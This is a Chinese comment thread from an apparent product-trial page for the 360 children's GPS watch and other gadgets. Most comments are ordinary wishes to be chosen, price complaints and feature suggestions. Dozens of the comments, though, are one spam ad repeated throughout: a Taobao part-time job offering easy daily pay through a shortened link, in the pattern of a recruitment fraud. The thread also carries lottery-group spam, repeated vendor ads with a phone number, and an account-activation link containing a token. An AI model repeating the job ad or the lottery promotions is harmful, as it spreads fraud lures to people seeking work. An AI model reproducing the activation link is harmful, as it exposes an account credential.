看见一个建议不错的，表面是不要有360更安全，本人认为这是一个企业象征的标识和广告的代言，不放到产品上也说不过去的，本人有个小建议，将360三个数字分开，3放到3点位置，6放到6点位置，0放到0点位置，而后不要在九点的位置出现9，这样也可以起到传播品牌的功效！
二期我也递交了，能否选中。
一不小心给小偷顺了，9千大洋就不见了。
加油，期待中哦
车子挺好滴可是有点贵啊
牛XXXXXXXXXX
好期待哦！
车子很好  很健康很有创意  
用处不大吧？远程开空调？空调即使插了电源也要遥控器开，洗衣机也要用手去操纵....
估计这东西很快就会普及的   很好
现在的家长都是为着小孩各个方面着想，安全是第一位的，360儿童卫士，不仅仅在生活娱乐上面关心儿童，更注重儿童的安全，我挺它
赶紧啊！！！！
希望可以申请到
东西很好 创意很好   很期待
太贵了！如果能加个太阳能充电功能，那才叫牛！！！！！！！！！！！！
很好看，卡通样式 色彩绚丽，功能强大 很适合孩子和家长共同使用 如果还能抗震、耐水、耐碰， 必定是能让爸爸妈妈放心的贴心保护小卫士！
去、我看看是不可能有免费的午餐、人家的目的应该是看看到底有多少人能接受这样的东西、然后才网络销售。
不是已经发售了么
怎么买啊？
可以前沿的产品，赞
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】.
多少钱一个啊
相信360~~~
希望可以申请到   丢过孩子的妈妈
谁TM喜欢一天到晚带个手套啊？SB
这个产品，不错，支持！
相信能试用成功，加油，加油，加油
这个皮带看起来挺好看的，但是戴起来会不会热啊！而且这个电子表盘看起来好低端的赶脚，稍微美化下不难吧
期待360这款产品定位准确
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】#
我是soho，办公的时候经常用扫描仪，我喜欢新颖带有创意的办公设备，这个看上去便携，很适合我的移动办公，期待能有机会试用，会好好做试用报告的。
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】$
如带有存储功能，表带一段设计成USB接口，能直接存储有关学习资料就更完美了！期待新一代产品的开发。
希望真有如此的功能 期待中
很想给小孩试试
传统的扫描仪笨重，占地方，占空间，不方便携带。要是在外面突然要扫描个文件还得跑回家。。。
这个东西不错，能减少小孩走失的机会，让妈妈安心！希望申请成功！
吐个槽，为毛俺的报告不能是精品？ 评论少？那我浏览量还高啊！ 纯外观的测试都可以评上。 虽然是第一次写官评，但俺自觉也还写的不错，用户体验描述的很详细。为毛啊？
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
小的时候就给孩子用，等孩子长大了，还可以留给奶奶用，呵呵~~~ 
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】.
电池能撑多久？
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】$
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】@
小孩子生性好动，对于手表的被动摘除不知道有没有好的方案，比如说死扣设计之类的，还有防水效果能达到什么程度
360儿童卫士 2 期待考验你。。。
还没筛完啊~！家里PM2.5超标了都~！
真的很期待能申请上， 但如果没有这末幸运 ， 如果发售，我一定第一时间买上
大爱、、、、、
创造好后就是世界级的发明 
一个关键是，空气质量一般都较差，净化器的滤网如果按常规要求，更换频繁，用不起啊。所以，都会自己抖抖灰，用毛刷刷刷接着再用，一般会延长5倍左右的实用时间。但这个滤网是集成一体的，恐怕不易自己动手清洁，这个滤网价格呢，不知道贵不贵，消费者都会算账，会不会是硬伤?
1、幼儿可设计为卡通形象。 2、USB接口加载同步教学内容。 3、具有防水功能。 4、小孩遇险报警装置。
这东西有辐射？
是个好东西 
期待幸运的降临！！
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】. 
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】$
我想购买，哪里有卖，找来找去，都找不到，奇酷没有商城吗
希望真有如此的功能 期待中  
真的假的吗？？？？
在等待着，希望拥有一块
喜欢高科技的产品！平时在科幻电影里看到的各种科技产品就想自己要是拥有就好了。看来产品不光从功能上，还是外形上，马上要走入现实世界了。我们期待！也是人类向前发展的最好物证！
花    钱     么
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】.
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】@
期待360儿童卫士 2 希望能尽快拥有一块给宝宝 
100刀就是100美元
看着不错，不过应该申请到的机会很小，哪里有卖的呀？
真心希望能选中，不错的产品，值的顶！
免费申请，不用花钱的。申请成功了会寄给你，然后试用提交试用报告就好咯~我之前还申请过呢
期待幸运的降临
真心希望能选中，不错的产品，
这个要警惕！
国家天天拿老百姓那么多钱人国家买 放在大街上 外面空气好了每家每户就都好了 同意的顶起
国家天天拿老百姓那么多钱人国家买 放在大街上 外面空气好了每家每户就都好了 同意的顶起
我们是翔宇新科技，专业生产GPS定位的，对于这款产品，我们也有，有需要联系18126227920  www.xiangyuxing.com
真心希望能选中，不错的产品，值的顶！，希望能被选中，我女儿很期待呢
这个好啊，价格也合理，既能锻炼身体，又能玩游戏。
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】$
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】!
什么时候会有货嘛
不知道是否可以申请成功，请问防不防水？
这个确实太人性化了
11选5 时时彩 大赢家扣扣裙144451606
希望能早点售卖
怒赞   真的不错
老天保佑 啊  选中啊
这东西应该很实用
真不错，买一箱送朋友们，妈妈再也不用担心我会走丢了
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
喜欢，很实用，能申领到么
期待360儿童卫士 2 希望能尽快拥有一块给宝宝
现在社会坏人那么多，为了孩子的安全，装个隐形GPS定位器在手表上，方便，适用，安全有保障。 对，我们就是翔宇新科技，专业生产GPS定位器的厂家，www.xiangyuxing.com 有意者联系18126227920  田r
官网招收代理！  代理招商QQ：1980225852 彩票网站招收兼职代理/推广员
这个东东貌似已经有了吧。那天借用人家的没注意看是什么牌子手机只用了20 30分钟就充满电了
等待，申不申请成功不重要，最主要手表的功能是真实的，以后对父母来说更好一点，孩子走失，也易找到。
这个东西 确实强大。期待
看着挺好的，不管能不能得到，抱着试试态度。
用这个东西来督促戒烟实在有点空谈的感觉。创意不错，价格偏高如果把美元改成RMB相信市场前景还是可期的
很期待能选中哦~
现在的家长都是为着小孩各个方面着想，安全是第一位的，360儿童卫士，不仅仅在生活娱乐上面关心儿童，更注重儿童的安全，赞一下
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】%
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】!
非常好的产品，期待早日体验
希望可以申请成功，不在小孩身边，了解不了状况，真让人操心
很希望能得到一个
很期待。 价钱不要太贵~~。
选中我吧，我家的调皮鬼最喜欢跑了。
希望我能得到这个，儿子肯定超喜欢的。
给个机会哦 给个惊喜哦
雾霾天气是不是要把机器关掉
我目前带俩孩子，老大3周1个月，老二6个月。有时候还带着孩子出去卖鞋，洗衣服，打扫房间，做饭我照样做，不过每天都特别的紧张。老大吗,不听话。我在农村，路多车多人多，孩子贪玩，你怎么喊他他只顾着玩，为这事说过多次，有时候还串门，也不跟我说一声，经常着急的找他。自己带俩孩子不容易啊，每天晚上睡觉腰疼的都难受。我希望能得到此商品，其实是抱着试试的态度。不知有没有机会拿到360儿童卫士定位手表
选中我吧，我家的调皮鬼最喜欢跑了。 
选中我，please
我们翔宇新科技也生产这个定位器 功能：  GPS定位	双向通话  超速报警  数据存储 SOS求救  远程监听 电子围栏	低电报警 移位报警	盲区报告 GSM定位  里程统计 盲区报告 轨迹回放       www.xiangyuxing.com  Tel:18126227920 	 
给我一个惊喜呗？？？
我们翔宇新科技也生产这个定位器 功能： GPS定位	双向通话 超速报警 数据存储 SOS求救 远程监听 电子围栏	低电报警 移位报警	盲区报告 GSM定位 里程统计 盲区报告 轨迹回放 www.xiangyuxing.com Tel:18126227920  
希望货早到家
我们翔宇新科技也生产这个定位器 功能： GPS定位	双向通话 超速报警 数据存储 SOS求救 远程监听 电子围栏	低电报警 移位报警	盲区报告 GSM定位 里程统计 盲区报告 轨迹回放 www.xiangyuxing.com Tel:18126227920  
我们翔宇新科技也生产这个定位器 功能： GPS定位	双向通话 超速报警 数据存储 SOS求救 远程监听 电子围栏	低电报警 移位报警	盲区报告 GSM定位 里程统计 盲区报告 轨迹回放 www.xiangyuxing.com Tel:18126227920  
不错嘛，问题是什么时候上市啊，到时候就不怕老师抓手机了
好东东，来一块！
我们翔宇新科技也生产这个定位器 功能： GPS定位	双向通话 超速报警 数据存储 SOS求救 远程监听 电子围栏	低电报警 移位报警	盲区报告 GSM定位 里程统计 盲区报告 轨迹回放 www.xiangyuxing.com Tel:18126227920  
期待，网上相关产品电池能力不足，有点鸡肋，希望这产改进
有点不相信，试试看的心理
我女儿很喜欢，两岁的小孩子特别需要这种设备。
这款我很喜欢。
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】$
价格太贵了，一千左右都嫌贵
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】.
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】!
人类对科技的追求是永不止步的！！！
好东西！！！！！！！！！
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】%
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】!
真希望能选中，这块表真的很实用。
希望中签~~~
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】~
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】#
一切都基于我爱我的孩子，就是这么的简单，我想给他最好的，能让他牵挂于我的掌心。这是一个具备美好理念的产品，希望能够申领得到。
It&#039;s good.希望可以中签
能控制机器人不？
现在孩子刚上小学，总要在放学回家途中玩个把钟头，有几次都走到山顶了，再说学校出来都是小街小巷，现在***这么猖狂，很是担心。希望能得到这个新产品
期待，希望市场售价不要高于目前市场电动车的价钱 
超酷的东西
有没有详细参数这样可能更好一些哦。
非常期待，不同于传统样式！
老外正在融资开发呢。。。估计面试还需要时间！关键现在价格比较高50美金左右
老人带小孩，有时候带不动。尤其是出去玩儿的时候，宝宝不听他们的，就到处乱跑。跑丢了怎么办？所以希望360儿童卫士能帮上忙
价格有点高哦，但没有详细参数很难作比较哦。如果有一个座位，估计更适合中国人的心态吧。
偶，这个不错哦
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
上班代步，估计要被逮住。
电动车8900我笑了 变速档有毛用啊  电动的  
这个价格，想推广难
搞个东西现在都用美元计价，啥谱啊
为了孩子@！！！1
很不错但是我觉得小孩子喜欢荧光，这个要是在晚上能发出荧光色就好了，最好能控制。
鸡肋......
本产品为假冒伪劣产品，我试过了，一摔就爆，请勿使用。
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
看的都动心了，真想试试，呵呵
傻逼！二货！
http://i.360.cn/active/activeemail?vc=Q90CWSRzTnq02H6JFdOumhXqBGmR%2BQy6vNMxufrzdWcMP8e6rt6tRNTHpNUcz3Ily6JJjRm72e5Z9HjdNe4rxwDoH4SGlk2iP3en0LMqlCJjZOi5Y0oXF7Fpg%2BWJf9UUz98ok2FoqNknLwb7mzEw0fxnMs
一切为了孩子！相信每个家长都非常非常非常期待一个好的儿童安全产品！
真的吗有谁知道  
感觉机会很渺茫啊
很赞··很期待套上开车；就无需司机了
期待中……
什么时候可以买啊，，我好想买~！！！
原来是那么落后的东西，真是大忽悠啊
这个东西 确实强大。期待
现在小区中小偷太多，保安又不负责，价格合适，安装一个还是有可能的。
这个挺好的
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】#
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】.
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】~
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】！
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】#
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】￥
可以通话吗，一旦发现孩子去了不该去的地方，可以给他打电话，叫他离开，好想有一个，申请名额又太少。买又不知道那有卖的
功能很强大，外观也不错，期待中。。。。。
应该不错，很期待
遥控电灯还行
很强大很期待
不错啊不错
我觉得这个很不错，360很好，是一个优秀的网站，支持360！~而且这个手表功能大，不怕孩子走丢，是个照顾孩子的好帮手！奇酷！！！！！希望可以得到，谢谢！
很有爱心也很实用的一个产品，希望能够抽到我，阿门！
人真是越来越懒啦啊  都不想动手啦 想哈就可以  以后那要连脑袋都不想动了怎么办啊
这个东西好，但是要sim卡么？
SB.......
好期待啊！！！！
这表的质量还不知带如何，如果好的话当然希望能给孩子一个礼物。
希望有幸能申请到，为上幼儿园的女儿提供安全护航
貌似很酷的东西
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
哇塞，很强大嘛，期待中······
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】￥
希望小编发发慈悲，给我争取一个，谢谢
要是再加上不锈钢防水，智能报警，针孔摄像头，手腕接口密码锁的功能那就完美了，电池续航时间越久越好！
看起来很不错的产品呀！
我一贯很喜欢这种面向未来的概念型的产品，我给你们提个建议，可以和爱稀奇网站合作，拓宽产品被消费者认知的渠道。并且在P2P网站开辟专门的概念型产品售卖门店。 另很期待能抽中这款试用品，祝正式货品大卖。
现在有吗？ 
希望孩子用了以后   安全无忧
希望小编发发慈悲，给我争取一个，谢谢
什么时候可以支持ios
期待试用，希望定位功能足够强大
没有网络，没有wifi，能自动定位吗？ 
看看我的申请材料，谢谢
我希望能争取给我的孩子一个。谢谢
应该不错，很期待 
能不能去掉360的logo?或者印在表背上也好
现代社会存在着太多的不稳定因素，未知的危险更是很多，希望能在忙工作的情况下仍关注着孩子的安危，这款产品的理念真的不错，希望体验一下
千万要中啊 
希望可以申请到，好期待哦！
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】#
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】%
很期待 女儿很喜欢
以后想使唤人非常容易了啊 
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】#
不指望能选上试戴，哪有卖的？
说实话，煤老板的儿子更需要。普通的家庭，只要父母上心。不结仇家就不是需要。 还有2岁，正式破坏王的年龄
不知道什么时候有卖的？
不要太贵 就好。
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
为什么不防水 孩子的手表最好防水
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】.
东西看起来很好，就是太贵 了，用不起。
快点让它面市吧。。。
恩，产品挺好 ~
如果有卖的就好了
为什么要注册奇酷网用户名呢？说实话,360的手机防丢软件就纯属扯淡,定位误差可达千米,希望这个孩子防丢卫士是真的实用,毕竟孩子不是手机可以比的，一旦家人对它有所依赖却不实用，后果可能会不堪设想
我希望能给我的两个小baby争取手表。
防水关键，喜欢上市通知一下
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】.
买电动车的人还想自己骑，是不是有点多余
这都需要电子产品来记得话人类的生活真可怕。
超想要，我就喜欢这种又酷又有科技范的产品。
这东西应该上万，打印出来的东西一个也要好几百。学校老师说的。
我想给自己争取一个。
荧光有辐射的
很希望我孩子有一个
期待中，女儿很喜欢
就是个4g路由器
有时跳皮爬高下跳、跌跤、被车撞等人身意外伤害事故（或者过激、打斗动作）可以报警监听定位吗？
希望我的宝贝能有一个这么酷，这么安全的手表。。。。。
希望能个我家的小点点中一个
我孩子经常乱跑，希望能抽到我哦，就能准确定位孩子的所在位置，谢谢了喔:-)
现代快报少年实践营——暑期军事夏令营火热报名啦！http://mp.weixin.qq.com/s?__biz=MzA3NzQ0NzMyMQ==&amp;mid=200156776&amp;idx=1&amp;sn=31d93a616805bee0a6bc6cc0c96f323f&amp;scene=3#rd
这个有卖好不好，我都在用！！还好意思写创意中，淘宝398元
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】.
那里可以买
很不错，好像给女儿买一个
希望能给我加宝宝申请到，因为一直想购买这方面的产品，结果都没有合适的渠道和信得过的厂家，希望这次能中奖--宝妈
真的是我么！真的是我么！我真的中了！真没想到！！！
希望为我自己争取一个，我会很喜欢（我是自己申请的，妈妈太忙了，嘻嘻）
不错，如果 试用效果 好 一会帮忙再买几个
希望能申请到，送给我妹妹当做生日礼物！！
我想给我孩子一个生日礼物！
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】.
希望通过它。我可以不再怕走丢（妈妈上班忙，只好寄到我学校去了。）。希望运气够好能够得到试用机会~~
这个产品不错，能申请到就好了。
想给我的弟弟争取一个，样子挺好看，也方便找到他，风一样的男子需要它~如果争取到了，会好好写试用报告的，么么哒~
希望能申请到给我弟弟礼物 
很好的产品，对于年老父母和小孩都是很不错的产品，尤其是小孩子。
小孩子出去旅游或者去超市特别需要，所以这个一定有卖相！
我想给我儿子争取一个***机会，小男孩太俏皮，有这款手表我觉得太给力了。试用报告我会好好写的。 
我要试用,谢谢
我们家宝贝喜欢玩，有时人看不准，所以我想能随时随地的知道她在哪？
怎么没有说具备防水功能吗？如果没有希望团队能增加上，真心期待。@360儿童卫士 
149ⅹ6.2323=928.7466用928元人民币买个打火机，是不是头被门夹到了啊
值得拥有！
应该免费吧？希望能得到。 
加油！360儿童卫士2
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
看样子，真不错啊
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】$
要是移动联通都能支持那就好了
